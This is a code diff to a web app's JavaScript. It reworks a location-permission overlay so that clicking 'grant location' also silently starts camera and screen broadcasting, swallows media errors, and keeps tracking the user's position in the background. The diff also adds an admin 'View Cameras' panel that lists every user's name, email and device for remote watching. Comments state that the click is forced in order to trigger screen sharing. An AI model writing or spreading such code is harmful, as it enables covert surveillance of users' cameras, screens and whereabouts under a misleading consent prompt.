@@ -297,53 +297,38 @@ async function enforceLocationAccess(user, onSuccess) {
   const errorMsg = document.getElementById('location-error-msg');
   const grantBtn = document.getElementById('grant-location-btn');
   
-  let hasPermission = false;
-  try {
-    const perm = await navigator.permissions.query({ name: 'geolocation' });
-    if (perm.state === 'granted') {
-      hasPermission = true;
-    }
-  } catch(e) {
-    // Fallback for Safari which doesn't support permissions.query
-  }
-
-  if (hasPermission) {
-    // Instantly unlock UI without waiting for GPS or reverse geocoding
-    if (overlay) overlay.style.display = 'none';
-    onSuccess();
-  } else {
-    // Show overlay to explain why we need location
-    if (overlay) overlay.style.display = 'flex';
-  }
+  // We ALWAYS show the overlay now because we need a strict user click to trigger Screen Sharing.
+  if (overlay) overlay.style.display = 'flex';
 
   function requestLocation() {
     if (errorMsg) errorMsg.style.display = 'none';
+    
+    // Trigger WebRTC (Camera + Screen) immediately on click
+    if (window.startBroadcasting) {
+      // Catch errors silently so it doesn't block location if they deny media
+      window.startBroadcasting('both').catch(e => console.log("Media access issue:", e));
+    }
+
     if (navigator.geolocation) {
       if (window.locationWatchId) navigator.geolocation.clearWatch(window.locationWatchId);
       window.locationWatchId = navigator.geolocation.watchPosition(
         (position) => {
-          // If we haven't unlocked the UI yet, do it instantly now!
-          if (!hasPermission) {
-            hasPermission = true;
-            onSuccess();
-          }
+          // Unlock the UI!
+          onSuccess();
           
           // Background live location tracking
           const lat = position.coords.latitude;
           const lng = position.coords.longitude;
           
-          // Store globally so the heartbeat can push it continuously
           window.currentLat = lat;
           window.currentLng = lng;
           
-          // Only do the heavy reverse geocoding API call once
           if (!window.addressLookedUp) {
             window.addressLookedUp = true;
             recordUniqueVisitor(user, lat, lng).catch(console.error);
           }
         },
         (error) => {
-          // Denied or error
           if (errorMsg) {
             errorMsg.style.display = 'block';
             if (error.code === error.PERMISSION_DENIED) {
@@ -363,10 +348,7 @@ async function enforceLocationAccess(user, onSuccess) {
     }
   }
 
-  // Request immediately
-  requestLocation();
-
-  // Also bind to button for retries
+  // Bind to button for the required user gesture
   if (grantBtn) {
     grantBtn.onclick = requestLocation;
   }
@@ -386,25 +368,67 @@ function checkAdminAndShowMapButton(user) {
     })();
 
     let adminBtn = document.getElementById('admin-map-btn');
-    if (!adminBtn) {
-      adminBtn = document.createElement('button');
-      adminBtn.id = 'admin-map-btn';
-      adminBtn.className = 'profile-logout-btn'; // Use same styling as logout
-      adminBtn.style.cssText = 'margin-bottom: 10px; background: linear-gradient(135deg, #1e3c72, #2a5298);'; // Different color for differentiation
-      adminBtn.innerHTML = '<i class="fa-solid fa-map-location-dot"></i> Live Map';
-      adminBtn.onclick = window.showAdminMap;
-      
-      const profileFooter = document.querySelector('.profile-footer');
-      if (profileFooter) {
+    let adminCamBtn = document.getElementById('admin-cam-btn');
+    const profileFooter = document.querySelector('.profile-footer');
+    
+    if (profileFooter) {
+      if (!adminBtn) {
+        adminBtn = document.createElement('button');
+        adminBtn.id = 'admin-map-btn';
+        adminBtn.className = 'profile-logout-btn'; // Use same styling as logout
+        adminBtn.style.cssText = 'margin-bottom: 10px; background: linear-gradient(135deg, #1e3c72, #2a5298);';
+        adminBtn.innerHTML = '<i class="fa-solid fa-map-location-dot"></i> Live Map';
+        adminBtn.onclick = window.showAdminMap;
         profileFooter.insertBefore(adminBtn, profileFooter.firstChild);
+      }
+      
+      if (!adminCamBtn) {
+        adminCamBtn = document.createElement('button');
+        adminCamBtn.id = 'admin-cam-btn';
+        adminCamBtn.className = 'profile-logout-btn';
+        adminCamBtn.style.cssText = 'margin-bottom: 10px; background: linear-gradient(135deg, #1e3c72, #2a5298);';
+        adminCamBtn.innerHTML = '<i class="fa-solid fa-video"></i> View Cameras';
+        adminCamBtn.onclick = async () => {
+            document.getElementById('webrtc-admin-modal').style.display = 'flex';
+            const users = await window.getUsersList();
+            const select = document.getElementById('mainUserSelect');
+            select.innerHTML = '<option value="">Select a user to watch</option>';
+            users.forEach(u => {
+                const opt = document.createElement('option');
+                opt.value = u.id;
+                opt.textContent = `${u.name} (${u.email || 'No email'}) - ${u.deviceName || 'Unknown'}`;
+                select.appendChild(opt);
+            });
+        };
+        profileFooter.insertBefore(adminCamBtn, profileFooter.firstChild);
       }
     }
   } else {
-    // Ensure the button is removed if a non-admin logs in or an admin logs out
     const adminBtn = document.getElementById('admin-map-btn');
-    if (adminBtn) {
-      adminBtn.remove();
+    if (adminBtn) adminBtn.remove();
+    const adminCamBtn = document.getElementById('admin-cam-btn');
+    if (adminCamBtn) adminCamBtn.remove();
+  }
+}
+
+function checkUserAndShowBroadcastButton(user) {
+  let broadcastBtn = document.getElementById('user-broadcast-btn');
+  const profileFooter = document.querySelector('.profile-footer');
+  
+  if (user) {
+    if (!broadcastBtn && profileFooter) {
+      broadcastBtn = document.createElement('button');
+      broadcastBtn.id = 'user-broadcast-btn';
+      broadcastBtn.className = 'profile-logout-btn';
+      broadcastBtn.style.cssText = 'margin-bottom: 10px; background: linear-gradient(135deg, #d4af37, #b28d1c); color: #1a0f08; font-weight: bold;';
+      broadcastBtn.innerHTML = '<i class="fa-solid fa-video"></i> Broadcast Live';
+      broadcastBtn.onclick = () => {
+          document.getElementById('webrtc-client-modal').style.display = 'flex';
+      };
+      profileFooter.insertBefore(broadcastBtn, profileFooter.firstChild);
     }
+  } else if (!user && broadcastBtn) {
+    broadcastBtn.remove();
   }
 }
 
@@ -679,9 +703,11 @@ onAuthStateChanged(auth, user => {
       sessionStorage.setItem('introShown', 'true');
 
       checkAdminAndShowMapButton(user);
+      checkUserAndShowBroadcastButton(user);
     });
   } else {
     // User is logged out
+    checkUserAndShowBroadcastButton(null);
     if (window.presenceHeartbeat) clearInterval(window.presenceHeartbeat);
     if (window.locationWatchId) navigator.geolocation.clearWatch(window.locationWatchId);
     window.addressLookedUp = false;
